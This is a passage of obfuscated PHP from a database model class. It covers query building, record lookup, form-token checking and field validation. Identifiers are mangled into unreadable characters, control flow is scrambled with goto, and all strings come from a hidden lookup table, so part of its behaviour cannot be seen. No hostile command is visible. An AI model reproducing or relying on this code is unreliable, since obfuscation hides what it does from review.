$this->_afterSelect($dõÑÔ…‚ñ, $dœæÀòÃñ); return $dõÑÔ…‚ñ; goto c²ªÆË±²; a•…è›Ø«: $dõÑÔ…‚ñ = $this->db->select($dœæÀòÃñ); if (!1 === $dõÑÔ…‚ñ) { return !1; } if (empty($dõÑÔ…‚ñ)) { return null; } goto b“˜ïÙÌ÷Ÿ; c²ªÆË±²: } protected function _afterSelect(&$b‘å™¤›¶É, $d¾Ş©Ğ¨ˆÊ) { } public function buildSql($a–å¾Ó„ì = array()) { $a«Ò¸ğŠŸØ =& $_SERVER[µ…]; $a–å¾Ó„ì = $this->_parseOptions($a–å¾Ó„ì); return $a«Ò¸ğŠŸØ[273] . $this->db->buildSelectSql($a–å¾Ó„ì) . $a«Ò¸ğŠŸØ[274]; } public function optionsValue($dô›Â½¡² = null) { if (is_null($dô›Â½¡²)) { return $this->options; } elseif (is_array($dô›Â½¡²)) { $this->options = array_merge($this->options, $dô›Â½¡²); } } protected function _parseOptions($cºæŠÖÕÊ = array()) { goto e£¿¥º–; d×Â‡¡›Ò¨: if (isset($cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[271]]) && is_array($cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[271]]) && !empty($E¥ˆãôÓõÑ) && !isset($cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[278]]) && !isset($cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[275]])) { foreach ($cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[271]] as $fˆ÷¢ „±ç => $E“šŞöÄñÖ) { $fˆ÷¢ „±ç = trim($fˆ÷¢ „±ç); if (in_array($fˆ÷¢ „±ç, $E¥ˆãôÓõÑ, !0)) { if (is_scalar($E“šŞöÄñÖ)) { $this->_parseType($cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[271]], $fˆ÷¢ „±ç); } } elseif (!is_numeric($fˆ÷¢ „±ç) && $b¸ç’ƒ‹Ãì[70] != substr($fˆ÷¢ „±ç, 0, 1) && !1 === strpos($fˆ÷¢ „±ç, $b¸ç’ƒ‹Ãì[94]) && !1 === strpos($fˆ÷¢ „±ç, $b¸ç’ƒ‹Ãì[256]) && !1 === strpos($fˆ÷¢ „±ç, $b¸ç’ƒ‹Ãì[279]) && !1 === strpos($fˆ÷¢ „±ç, $b¸ç’ƒ‹Ãì[280])) { unset($cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[271]][$fˆ÷¢ „±ç]); } } } $this->_options_filter($cºæŠÖÕÊ); return $cºæŠÖÕÊ; goto Dîœ‡™œ×; EŞëŞ×Í°‹: if (!isset($cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[275]])) { $cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[275]] = $this->getTableName(); $E¥ˆãôÓõÑ = $this->fields; } else { $E¥ˆãôÓõÑ = $this->getDbFields(); } if (!empty($cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[276]])) { $cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[275]] .= $b¸ç’ƒ‹Ãì[50] . $cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[276]]; } $cºæŠÖÕÊ[$b¸ç’ƒ‹Ãì[277]] = $this->name; goto d×Â‡¡›Ò¨; e£¿¥º–: $b¸ç’ƒ‹Ãì =& $_SERVER[µ…]; if (is_array($cºæŠÖÕÊ)) { $cºæŠÖÕÊ = array_merge($this->options, $cºæŠÖÕÊ); } $this->options = array(); goto EŞëŞ×Í°‹; Dîœ‡™œ×: } protected function _options_filter(&$f¤ŸÛ¥«Ñ) { } protected function _parseType(&$d¸§‡ğÊå¾, $Bø„İ†‹²) { $dÈ—ñÂŸè =& $_SERVER[µ…]; if (empty($this->options[$dÈ—ñÂŸè[281]][$dÈ—ñÂŸè[4] . $Bø„İ†‹²])) { $A‘¸œÀ›ƒù = strtolower($this->fields[$dÈ—ñÂŸè[248]][$Bø„İ†‹²]); if (!1 !== strpos($A‘¸œÀ›ƒù, $dÈ—ñÂŸè[282])) { } elseif (!1 === strpos($A‘¸œÀ›ƒù, $dÈ—ñÂŸè[283]) && !1 !== strpos($A‘¸œÀ›ƒù, $dÈ—ñÂŸè[284])) { $d¸§‡ğÊå¾[$Bø„İ†‹²] = intval($d¸§‡ğÊå¾[$Bø„İ†‹²]); } elseif (!1 !== strpos($A‘¸œÀ›ƒù, $dÈ—ñÂŸè[285]) || !1 !== strpos($A‘¸œÀ›ƒù, $dÈ—ñÂŸè[286])) { $d¸§‡ğÊå¾[$Bø„İ†‹²] = floatval($d¸§‡ğÊå¾[$Bø„İ†‹²]); } elseif (!1 !== strpos($A‘¸œÀ›ƒù, $dÈ—ñÂŸè[287])) { $d¸§‡ğÊå¾[$Bø„İ†‹²] = (bool) $d¸§‡ğÊå¾[$Bø„İ†‹²]; } } } public function find($FÛ–ÆƒÌ° = array()) { goto e¼à‡Ğ«å„; e¼à‡Ğ«å„: $Dê¶¢ò„‡– =& $_SERVER[µ…]; if (is_numeric($FÛ–ÆƒÌ°) || is_string($FÛ–ÆƒÌ°)) { $d¶Úô¼Ï°´[$this->getPk()] = intval($FÛ–ÆƒÌ°); $this->options[$Dê¶¢ò„‡–[271]] = $d¶Úô¼Ï°´; } $this->options[$Dê¶¢ò„‡–[288]] = 1; goto BÙùî”÷áÃ; BÙùî”÷áÃ: $FÛ–ÆƒÌ° = $this->_parseOptions(); $bÑßõ›Ï·Ö = $this->db->select($FÛ–ÆƒÌ°); if (!1 === $bÑßõ›Ï·Ö) { return !1; } goto Eãòï®“; e³¯²ÈĞ„í: if (!empty($this->options[$Dê¶¢ò„‡–[289]])) { return $this->returnResult($this->data, $this->options[$Dê¶¢ò„‡–[289]]); } return $this->data; goto E´§Ë–¹Íí; Eãòï®“: if (empty($bÑßõ›Ï·Ö)) { return null; } $this->data = $bÑßõ›Ï·Ö[0]; $this->_afterFind($this->data, $FÛ–ÆƒÌ°); goto e³¯²ÈĞ„í; E´§Ë–¹Íí: } protected function _afterFind(&$AÄËëµÈ…, $cİ¡»õÅ) { } protected function returnResult($Bµ›ó¹›Í, $bèÈÏÇ¥„ = '') { $B±öÀâÔ¬Ğ =& $_SERVER[µ…]; if ($bèÈÏÇ¥„) { if (is_callable($bèÈÏÇ¥„)) { return call_user_func($bèÈÏÇ¥„, $Bµ›ó¹›Í); } switch (strtolower($bèÈÏÇ¥„)) { case $B±öÀâÔ¬Ğ[290]: return json_encode($Bµ›ó¹›Í); case $B±öÀâÔ¬Ğ[291]: return xml_encode($Bµ›ó¹›Í); } } return $Bµ›ó¹›Í; } public function parseFieldsMap($e¯Ñ­±‰Ë‘, $fÏ‰’«°ˆ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $eø¢ïŸîŠ“ => $FÇ¿Ã„ôß) { if ($fÏ‰’«°ˆ == 1) { if (isset($e¯Ñ­±‰Ë‘[$FÇ¿Ã„ôß])) { $e¯Ñ­±‰Ë‘[$eø¢ïŸîŠ“] = $e¯Ñ­±‰Ë‘[$FÇ¿Ã„ôß]; unset($e¯Ñ­±‰Ë‘[$FÇ¿Ã„ôß]); } } else { if (isset($e¯Ñ­±‰Ë‘[$eø¢ïŸîŠ“])) { $e¯Ñ­±‰Ë‘[$FÇ¿Ã„ôß] = $e¯Ñ­±‰Ë‘[$eø¢ïŸîŠ“]; unset($e¯Ñ­±‰Ë‘[$eø¢ïŸîŠ“]); } } } } return $e¯Ñ­±‰Ë‘; } public function setField($cÁÄ‚Ÿˆê, $DÛÛ¿é¦§ = '') { if (is_array($cÁÄ‚Ÿˆê)) { $cˆ«Ö´àÄå = $cÁÄ‚Ÿˆê; } else { $cˆ«Ö´àÄå[$cÁÄ‚Ÿˆê] = $DÛÛ¿é¦§; } return $this->save($cˆ«Ö´àÄå); } public function setAdd($BË¹Ì›ÆÇŞ, $dä÷Ğ›´æ = 1) { $dŞŒ¨ä†å =& $_SERVER[µ…]; $E¬ÇÓ¸·ÄË = $BË¹Ì›ÆÇŞ . $dŞŒ¨ä†å[292] . $dä÷Ğ›´æ; if ($dä÷Ğ›´æ < 0) { $E¬ÇÓ¸·ÄË = $BË¹Ì›ÆÇŞ . $dä÷Ğ›´æ; } return $this->setField($BË¹Ì›ÆÇŞ, array($dŞŒ¨ä†å[293], $E¬ÇÓ¸·ÄË)); } public function getField($d¼¢¿Õƒé‹, $bÊĞÇ®Åˆ· = null) { $f–ÈÑ£ß‚ =& $_SERVER[µ…]; $D“ù­ÕÜÜ[$f–ÈÑ£ß‚[269]] = $d¼¢¿Õƒé‹; $D“ù­ÕÜÜ = $this->_parseOptions($D“ù­ÕÜÜ); $d¼¢¿Õƒé‹ = trim($d¼¢¿Õƒé‹); if (strpos($d¼¢¿Õƒé‹, $f–ÈÑ£ß‚[47])) { if (!isset($D“ù­ÕÜÜ[$f–ÈÑ£ß‚[288]])) { $D“ù­ÕÜÜ[$f–ÈÑ£ß‚[288]] = is_numeric($bÊĞÇ®Åˆ·) ? $bÊĞÇ®Åˆ· : $f–ÈÑ£ß‚[33]; } $dçø­†Ô¥ = $this->db->select($D“ù­ÕÜÜ); if (!empty($dçø­†Ô¥)) { goto Aˆñó¸ãğá; Aˆñó¸ãğá: $eÈ¼Ğñ–¡Ü = explode($f–ÈÑ£ß‚[47], $d¼¢¿Õƒé‹); $d¼¢¿Õƒé‹ = array_keys($dçø­†Ô¥[0]); $C¼’ì÷£¡ = array_shift($d¼¢¿Õƒé‹); goto aÖ¡Â„¿Àï; aÖ¡Â„¿Àï: $b©æ‰ = array_shift($d¼¢¿Õƒé‹); $Cø×ÅĞåƒË = array(); $c™È¾’›Ñ = count($eÈ¼Ğñ–¡Ü); goto bÊ¼ñÇÌç; bÊ¼ñÇÌç: foreach ($dçø­†Ô¥ as $cïˆˆŒğ) { $A¶™‚áÉ = $cïˆˆŒğ[$C¼’ì÷£¡]; if (2 == $c™È¾’›Ñ) { $Cø×ÅĞåƒË[$A¶™‚áÉ] = $cïˆˆŒğ[$b©æ‰]; } else { $Cø×ÅĞåƒË[$A¶™‚áÉ] = is_string($bÊĞÇ®Åˆ·) ? implode($bÊĞÇ®Åˆ·, $cïˆˆŒğ) : $cïˆˆŒğ; } } return $Cø×ÅĞåƒË; goto a„µç¶µØ‡; a„µç¶µØ‡: } } else { if (!0 !== $bÊĞÇ®Åˆ·) { $D“ù­ÕÜÜ[$f–ÈÑ£ß‚[288]] = is_numeric($bÊĞÇ®Åˆ·) ? $bÊĞÇ®Åˆ· : 1; } if ($bÊĞÇ®Åˆ· === $f–ÈÑ£ß‚[251]) { unset($D“ù­ÕÜÜ[$f–ÈÑ£ß‚[288]]); } $cïˆˆŒğ = $this->db->select($D“ù­ÕÜÜ); if (!empty($cïˆˆŒğ)) { if ($bÊĞÇ®Åˆ· === $f–ÈÑ£ß‚[251]) { return reset($cïˆˆŒğ[0]); } if (!0 !== $bÊĞÇ®Åˆ· && 1 == $D“ù­ÕÜÜ[$f–ÈÑ£ß‚[288]]) { return reset($cïˆˆŒğ[0]); } foreach ($cïˆˆŒğ as $dí…öˆÅ‹¡) { $DŞ“÷¤‰À“[] = $dí…öˆÅ‹¡[$d¼¢¿Õƒé‹]; } return $DŞ“÷¤‰À“; } } return null; } public function create($c„½èÒØ­ = '', $e†¼ç¹Ô¦ˆ = '') { goto d—ÉŠá•Ÿ•; eÉ¼³¨å¨Ø: return $c„½èÒØ­; goto e«ß¯–·‘Ÿ; DÑ†˜Ã±„Î: if ($this->autoCheckFields) { $D­ƒËÀÓì = $this->getDbFields(); foreach ($c„½èÒØ­ as $eÄ™™óõ³Ç => $dè˜Œ‹ˆêÜ) { if (!in_array($eÄ™™óõ³Ç, $D­ƒËÀÓì)) { unset($c„½èÒØ­[$eÄ™™óõ³Ç]); } elseif (MAGIC_QUOTES_GPC && is_string($dè˜Œ‹ˆêÜ)) { $c„½èÒØ­[$eÄ™™óõ³Ç] = stripslashes($dè˜Œ‹ˆêÜ); } } } $this->autoOperation($c„½èÒØ­, $e†¼ç¹Ô¦ˆ); $this->data = $c„½èÒØ­; goto eÉ¼³¨å¨Ø; dÚå†ˆ¢Êá: $c„½èÒØ­ = $this->parseFieldsMap($c„½èÒØ­, 0); $e†¼ç¹Ô¦ˆ = $e†¼ç¹Ô¦ˆ ? $e†¼ç¹Ô¦ˆ : (!empty($c„½èÒØ­[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$cĞùó³Å¨Û[269]])) { $D­ƒËÀÓì = $this->options[$cĞùó³Å¨Û[269]]; unset($this->options[$cĞùó³Å¨Û[269]]); } elseif ($e†¼ç¹Ô¦ˆ == THINK_MODEL_INSERT && isset($this->insertFields)) { $D­ƒËÀÓì = $this->insertFields; } elseif ($e†¼ç¹Ô¦ˆ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $D­ƒËÀÓì = $this->updateFields; } goto Aî—Åè—éÕ; d—ÉŠá•Ÿ•: $cĞùó³Å¨Û =& $_SERVER[µ…]; if (empty($c„½èÒØ­)) { $c„½èÒØ­ = $_POST; } elseif (is_object($c„½èÒØ­)) { $c„½èÒØ­ = get_object_vars($c„½èÒØ­); } if (empty($c„½èÒØ­) || !is_array($c„½èÒØ­)) { $this->error = think_lang($cĞùó³Å¨Û[267]); return !1; } goto dÚå†ˆ¢Êá; Aî—Åè—éÕ: if (isset($D­ƒËÀÓì)) { if (is_string($D­ƒËÀÓì)) { $D­ƒËÀÓì = explode($cĞùó³Å¨Û[47], $D­ƒËÀÓì); } if (think_config($cĞùó³Å¨Û[294])) { $D­ƒËÀÓì[] = think_config($cĞùó³Å¨Û[295]); } foreach ($c„½èÒØ­ as $eÄ™™óõ³Ç => $dè˜Œ‹ˆêÜ) { if (!in_array($eÄ™™óõ³Ç, $D­ƒËÀÓì)) { unset($c„½èÒØ­[$eÄ™™óõ³Ç]); } } } if (!$this->autoValidation($c„½èÒØ­, $e†¼ç¹Ô¦ˆ)) { return !1; } if (!$this->autoCheckToken($c„½èÒØ­)) { $this->error = think_lang($cĞùó³Å¨Û[296]); return !1; } goto DÑ†˜Ã±„Î; e«ß¯–·‘Ÿ: } public function autoCheckToken($F‹å–ëè·) { $dñËõõšãó =& $_SERVER[µ…]; if (isset($this->options[$dñËõõšãó[297]]) && !$this->options[$dñËõõšãó[297]]) { return !0; } if (think_config($dñËõõšãó[294])) { $d‚©è¸¦‚Ï = think_config($dñËõõšãó[295]); if (!isset($F‹å–ëè·[$d‚©è¸¦‚Ï]) || Session::get($d‚©è¸¦‚Ï)) { return !1; } list($D§Ğ’ğğÕÉ, $eëÃ‡¿ô…Ï) = explode($dñËõõšãó[70], $F‹å–ëè·[$d‚©è¸¦‚Ï]); if ($eëÃ‡¿ô…Ï && Session::get($d‚©è¸¦‚Ï . $dñËõõšãó[94] . $D§Ğ’ğğÕÉ) === $eëÃ‡¿ô…Ï) { Session::remove($d‚©è¸¦‚Ï . $dñËõõšãó[94] . $D§Ğ’ğğÕÉ); return !0; } if (think_config($dñËõõšãó[298])) { Session::remove($d‚©è¸¦‚Ï . $dñËõõšãó[94] . $D§Ğ’ğğÕÉ); } return !1; } return !0; } public function regex($C‡ÇÅ®Ûñ†, $DÎïšÎÒ) { $cïèÈÄåõ‰ =& $_SERVER[µ…]; $aêØ¦ø†Ò = array($cïèÈÄåõ‰[299] => $cïèÈÄåõ‰[300], $cïèÈÄåõ‰[301] => $cïèÈÄåõ‰[302], $cïèÈÄåõ‰[303] => $cïèÈÄåõ‰[304], $cïèÈÄåõ‰[305] => $cïèÈÄåõ‰[306], $cïèÈÄåõ‰[307] => $cïèÈÄåõ‰[308], $cïèÈÄåõ‰[309] => $cïèÈÄåõ‰[310], $cïèÈÄåõ‰[311] => $cïèÈÄåõ‰[312], $cïèÈÄåõ‰[286] => $cïèÈÄåõ‰[313], $cïèÈÄåõ‰[314] => $cïèÈÄåõ‰[315]); if (isset($aêØ¦ø†Ò[strtolower($DÎïšÎÒ)])) { $DÎïšÎÒ = $aêØ¦ø†Ò[strtolower($DÎïšÎÒ)]; } return preg_match($DÎïšÎÒ, $C‡ÇÅ®Ûñ†) === 1; } private function autoOperation(&$DÔ¦³ª½Æğ, $Aò†Ö·áê) { $eˆá™ÈÙ… =& $_SERVER[µ…]; if (!empty($this->options[$eˆá™ÈÙ…[316]])) { $b»åÂÜùÄ = $this->options[$eˆá™ÈÙ…[316]]; unset($this->options[$eˆá™ÈÙ…[316]]); } elseif (!empty($this->_auto)) { $b»åÂÜùÄ = $this->_auto; } if (isset($b»åÂÜùÄ)) { foreach ($b»åÂÜùÄ as $C»¨µö°Á) { if (empty($C»¨µö°Á[2])) { $C»¨µö°Á[2] = THINK_MODEL_INSERT; } if ($Aò†Ö·áê == $C»¨µö°Á[2] || $C»¨µö°Á[2] == THINK_MODEL_BOTH) { switch (trim($C»¨µö°Á[3])) { case $eˆá™ÈÙ…[317]: case $eˆá™ÈÙ…[318]: $DÆ¯Âêù‰ß = isset($C»¨µö°Á[4]) ? (array) $C»¨µö°Á[4] : array(); if (isset($DÔ¦³ª½Æğ[$C»¨µö°Á[0]])) { array_unshift($DÆ¯Âêù‰ß, $DÔ¦³ª½Æğ[$C»¨µö°Á[0]]); } if ($eˆá™ÈÙ…[317] == $C»¨µö°Á[3]) { $DÔ¦³ª½Æğ[$C»¨µö°Á[0]] = call_user_func_array($C»¨µö°Á[1], $DÆ¯Âêù‰ß); } else { $DÔ¦³ª½Æğ[$C»¨µö°Á[0]] = call_user_func_array(array(&$this, $C»¨µö°Á[1]), $DÆ¯Âêù‰ß); } break; case $eˆá™ÈÙ…[269]: $DÔ¦³ª½Æğ[$C»¨µö°Á[0]] = $DÔ¦³ª½Æğ[$C»¨µö°Á[1]]; break; case $eˆá™ÈÙ…[319]: if ($eˆá™ÈÙ…[33] === $DÔ¦³ª½Æğ[$C»¨µö°Á[0]]) { unset($DÔ¦³ª½Æğ[$C»¨µö°Á[0]]); } break; case $eˆá™ÈÙ…[320]: default: $DÔ¦³ª½Æğ[$C»¨µö°Á[0]] = $C»¨µö°Á[1]; } if (!1 === $DÔ¦³ª½Æğ[$C»¨µö°Á[0]]) { unset($DÔ¦³ª½Æğ[$C»¨µö°Á[0]]); } } } } return $DÔ¦³ª½Æğ; } protected function autoValidation($c™´½Éæ”ò, $D‰‚ÙìãŠ) { $eãÈ‡ñ½ =& $_SERVER[µ…]; if (!empty($this->options[$eãÈ‡ñ½[321]])) { $aÖé´‡ê¼Ç = $this->options[$eãÈ‡ñ½[321]]; unset($this->options[$eãÈ‡ñ½[321]]); } elseif (!empty($this->_validate)) { $aÖé´‡ê¼Ç = $this->_validate; } if (isset($aÖé´‡ê¼Ç)) { if ($this->patchValidate) { $this->error = array(); } foreach ($aÖé´‡ê¼Ç as $aíËá => $D”¡ˆ¶çÅ²) { if (empty($D”¡ˆ¶çÅ²[5]) || $D”¡ˆ¶çÅ²[5] == THINK_MODEL_BOTH || $D”¡ˆ¶çÅ²[5] == $D‰‚ÙìãŠ) { if (0 == strpos($D”¡ˆ¶çÅ²[2], $eãÈ‡ñ½[322]) && strpos($D”¡ˆ¶çÅ²[2], $eãÈ‡ñ½[323])) { $D”¡ˆ¶çÅ²[2] = think_lang(substr($D”¡ˆ¶çÅ²[2], 2, -1)); } $D”¡ˆ¶çÅ²[3] = isset($D”¡ˆ¶çÅ²[3]) ? $D”¡ˆ¶çÅ²[3] : THINK_EXISTS_VALIDATE; $D”¡ˆ¶çÅ²[4] = isset($D”¡ˆ¶çÅ²[4]) ? $D”¡ˆ¶çÅ²[4] : $eãÈ‡ñ½[324]; switch ($D”¡ˆ¶çÅ²[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($c™´½Éæ”ò, $D”¡ˆ¶çÅ²)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($eãÈ‡ñ½[33] != trim($c™´½Éæ”ò[$D”¡ˆ¶çÅ²[0]])) { if (!1 === $this->_validationField($c™´½Éæ”ò, $D”¡ˆ¶çÅ²)) { return !1; } } break; default: if (isset($c™´½Éæ”ò[$D”¡ˆ¶çÅ²[0]])) { if (!1 === $this->_validationField($c™´½Éæ”ò, $D”¡ˆ¶çÅ²)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($a“ÚóæªØ‹, $D’Í¾âÖê) { if (!1 === $this->_validationFieldItem($a“ÚóæªØ‹, $D’Í¾âÖê)) { if ($this->patchValidate) { $this->error[$D’Í¾âÖê[0]] = $D’Í¾âÖê[2]; } else { $this->error = $D’Í¾âÖê[2]; return !1; } } return; } protected function _validationFieldItem($Bã•„…¹ê, $eîìÜˆì÷) { $aŞªØÒçêë =& $_SERVER[µ…]; switch (strtolower(trim($eîìÜˆì÷[4]))) { case $aŞªØÒçêë[317]: case $aŞªØÒçêë[318]: $cíË¨’ ğª = isset($eîìÜˆì÷[6]) ? (array) $eîìÜˆì÷[6] : array(); if (is_string($eîìÜˆì÷[0]) && strpos($eîìÜˆì÷[0], $aŞªØÒçêë[47])) { $eîìÜˆì÷[0] = explode($aŞªØÒçêë[47], $eîìÜˆì÷[0]); } if (is_array($eîìÜˆì÷[0])) { foreach ($eîìÜˆì÷[0] as $a´À‰Ñ®®Û) { $FßãÁÂïĞ[$a´À‰Ñ®®Û] = $Bã•„…¹ê[$a´À‰Ñ®®Û]; } array_unshift($cíË¨’ ğª, $FßãÁÂïĞ); } else { array_unshift($cíË¨’ ğª, $Bã•„…¹ê[$eîìÜˆì÷[0]]); } if ($aŞªØÒçêë[317] == $eîìÜˆì÷[4]) { return call_user_func_array($eîìÜˆì÷[1], $cíË¨’ ğª); } else { return call_user_func_array(array(&$this, $eîìÜˆì÷[1]), $cíË¨’ ğª); } case $aŞªØÒçêë[325]: return $Bã•„…¹ê[$eîìÜˆì÷[0]] == $Bã•„…¹ê[$eîìÜˆì÷[1]]; case $aŞªØÒçêë[326]: if (is_string($eîìÜˆì÷[0]) && strpos($eîìÜˆì÷[0], $aŞªØÒçêë[47])) { $eîìÜˆì÷[0] = explode($aŞªØÒçêë[47], $eîìÜˆì÷[0]); } $B‰ïã‡÷Ì† = array(); if (is_array($eîìÜˆì÷[0])) { foreach ($eîìÜˆì÷[0] as $a´À‰Ñ®®Û) { $B‰ïã‡÷Ì†[$a´À‰Ñ®®Û] = $Bã•„…¹ê[$a´À‰Ñ®®Û]; } } else { $B‰ïã‡÷Ì†[$eîìÜˆì÷[0]] = $Bã•„…¹ê[$eîìÜˆì÷[0]]; } if (!empty($Bã•„…¹ê[$this->getPk()])) { $B‰ïã‡÷Ì†[$this->getPk()] = array($aŞªØÒçêë[327], $Bã•„…¹ê[$this->getPk()]); } if ($this->where($B‰ïã‡÷Ì†)->find()) { return !1; } return !0; default: return $this->check($Bã•„…¹ê[$eîìÜˆì÷[0]], $eîìÜˆì÷[1], $eîìÜˆì÷[4]); } } public function check($AÌ¾‘áåé, $dù°²¡Ç’³, $BÆ©Úç†œö = "\x72\x65\147\x65\x78") { $e•ÔöÕÎ³¶ =& $_SERVER[µ…]; $BÆ©Úç†œö = strtolower(trim($BÆ©Úç†œö)); switch ($BÆ©Úç†œö) { case $e•ÔöÕÎ³¶[7]: case $e•ÔöÕÎ³¶[328]: $a¨ªç›ßâ¿ = is_array($dù°²¡Ç’³) ? $dù°²¡Ç’³ : explode($e•ÔöÕÎ³¶[47], $dù°²¡Ç’³); return $BÆ©Úç†œö == $e•ÔöÕÎ³¶[7] ? in_array($AÌ¾‘áåé, $a¨ªç›ßâ¿) : !in_array($AÌ¾‘áåé, $a¨ªç›ßâ¿); case $e•ÔöÕÎ³¶[329]: case $e•ÔöÕÎ³¶[330]: if (is_array($dù°²¡Ç’³)) { $D¯¤ï‚—Èè = $dù°²¡Ç’³[0]; $bÑÒâç¡ÏÍ = $dù°²¡Ç’³[1]; } else { list($D¯¤ï‚—Èè, $bÑÒâç¡ÏÍ) = explode($e•ÔöÕÎ³¶[47], $dù°²¡Ç’³); } return $BÆ©Úç†œö == $e•ÔöÕÎ³¶[329] ? $AÌ¾‘áåé >= $D¯¤ï‚—Èè && $AÌ¾‘áåé <= $bÑÒâç¡ÏÍ : $AÌ¾‘áåé < $D¯¤ï‚—Èè || $AÌ¾‘áåé > $bÑÒâç¡ÏÍ; case $e•ÔöÕÎ³¶[331]: case $e•ÔöÕÎ³¶[332]: return $BÆ©Úç†œö == $e•ÔöÕÎ³¶[331] ? $AÌ¾‘áåé == $dù°²¡Ç’³ : $AÌ¾‘áåé != $dù°²¡Ç’³; case $e•ÔöÕÎ³¶[333]: $cÜ«“¡‘Òò = mb_strlen($AÌ¾‘áåé, $e•ÔöÕÎ³¶[334]); if (strpos($dù°²¡Ç’³, $e•ÔöÕÎ³¶[47])) { list($D¯¤ï‚—Èè, $bÑÒâç¡ÏÍ) = explode($e•ÔöÕÎ³¶[47], $dù°²¡Ç’³); return $cÜ«“¡‘Òò >= $D¯¤ï‚—Èè && $cÜ«“¡‘Òò <= $bÑÒâç¡ÏÍ; } else { return $cÜ«“¡‘Òò == $dù°²¡Ç’³; } case $e•ÔöÕÎ³¶[335]: list($D±ù¶Î’†•, $b¶øŸƒ÷¤ì) = explode($e•ÔöÕÎ³¶[47], $dù°²¡Ç’³); if (!is_numeric($D±ù¶Î’†•)) { $D±ù¶Î’†• = strtotime($D±ù¶Î’†•); } if (!is_numeric($b¶øŸƒ÷¤ì)) { $b¶øŸƒ÷¤ì = strtotime($b¶øŸƒ÷¤ì); } return NOW_TIME >= $D±ù¶Î’†• && NOW_TIME <= $b¶øŸƒ÷¤ì; case $e•ÔöÕÎ³¶[336]: return in_array(get_client_ip(), explode($e•ÔöÕÎ³¶[47], $dù°²¡Ç’³)); case $e•ÔöÕÎ³¶[337]: return !in_array(get_client_ip(), explode($e•ÔöÕÎ³¶[47], $dù°²¡Ç’³)); case $e•ÔöÕÎ³¶[324]: default: return $this->regex($AÌ¾‘áåé, $dù°²¡Ç’³); } } public function query($E¿±íœ¢¬Û, $eù•Öáæ = false) { $bÇÍ£Ë·”Û =& $_SERVER[µ…]; if (!is_bool($eù•Öáæ) && !is_array($eù•Öáæ)) { $eù•Öáæ = func_get_args(); array_shift($eù•Öáæ); } $E¿±íœ¢¬Û = str_replace(array($bÇÍ£Ë·”Û[227], $bÇÍ£Ë·”Û[338]), $bÇÍ£Ë·”Û[50], $E¿±íœ¢¬Û); $E¿±íœ¢¬Û = $this->parseSql($E¿±íœ¢¬Û, $eù•Öáæ); return $this->db->query($E¿±íœ¢¬Û); } public function execute($A£Ñœ…Æ²Ñ, $D±¹¤ÂÕ’ô = false) { if (!is_bool($D±¹¤ÂÕ’ô) && !is_array($D±¹¤ÂÕ’ô)) { $D±¹¤ÂÕ’ô = func_get_args(); array_shift($D±¹¤ÂÕ’ô); } $A£Ñœ…Æ²Ñ = $this->parseSql($A£Ñœ…Æ²Ñ, $D±¹¤ÂÕ’ô); return $this->db->execute($A£Ñœ…Æ²Ñ); } protected function parseSql($FÒ®ß­¼­Ã, $D¤µ›´©ø¢) { $eˆùÅ¯í…¡ =& $_SERVER[µ…]; if (!0 === $D¤µ›´©ø¢) { $D·ëñ”ÔÍÔ = $this->_parseOptions(); $FÒ®ß­¼­Ã = $this->db->parseSql($FÒ®ß­¼­Ã, $D·ëñ”ÔÍÔ); } elseif (is_array($D¤µ›´©ø¢)) { $D¤µ›´©ø¢ = array_map(array($this->db, $eˆùÅ¯í…¡[339]), $D¤µ›´©ø¢); $FÒ®ß­¼­Ã = vsprintf($FÒ®ß­¼­Ã, $D¤µ›´©ø¢); } else { $FÒ®ß­¼­Ã = strtr($FÒ®ß­¼­Ã, array($eˆùÅ¯í…¡[340] => $this->getTableName(), $eˆùÅ¯í…¡[341] => think_config($eˆùÅ¯í…¡[240]))); } $this->db->setModel($this->name); return $FÒ®ß­¼­Ã; } public function db($EÒ¾’‚íê© = '', $D»Ï±Êñ‘‚ = '', $b‘÷½§Ìõ¥ = array()) { goto aõ‹¤ÇÁŠ´; BŒ‚¢’à‚â: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto aÁŸáÂ¬Ùá; e–¿…Äªò: $BÓÑĞÃ˜°·[$EÒ¾’‚íê©] = $D»Ï±Êñ‘‚; $this->db = $BÂº’˜¦ì›[$EÒ¾’‚íê©]; $this->_after_db(); goto BŒ‚¢’à‚â; Aà®Ü­›Í: static $BÂº’˜¦ì› = array(); if (!isset($BÂº’˜¦ì›[$EÒ¾’‚íê©]) || isset($BÂº’˜¦ì›[$EÒ¾’‚íê©]) && $D»Ï±Êñ‘‚ && $BÓÑĞÃ˜°·[$EÒ¾’‚íê©] != $D»Ï±Êñ‘‚) { if (!empty($D»Ï±Êñ‘‚) && is_string($D»Ï±Êñ‘‚) && !1 === strpos($D»Ï±Êñ‘‚, $f™Ç³ÇÂÀÚ[8])) { $D»Ï±Êñ‘‚ = think_config($D»Ï±Êñ‘‚); } $BÂº’˜¦ì›[$EÒ¾’‚íê©] = Db::getInstance($D»Ï±Êñ‘‚); } elseif (NULL === $D»Ï±Êñ‘‚) { $BÂº’˜¦ì›[$EÒ¾’‚íê©]->close(); unset($BÂº’˜¦ì›[$EÒ¾’‚íê©]); return; } if (!empty($b‘÷½§Ìõ¥)) { if (is_string($b‘÷½§Ìõ¥)) { parse_str($b‘÷½§Ìõ¥, $b‘÷½§Ìõ¥); } foreach ($b‘÷½§Ìõ¥ as $BŞÊé¬Ö­Ì => $B£×Åè…‘) { $this->setProperty($BŞÊé¬Ö­Ì, $B£×Åè…‘); } } goto e–¿…Äªò; aõ‹¤ÇÁŠ´: $f™Ç³ÇÂÀÚ =& $_SERVER[µ…]; if 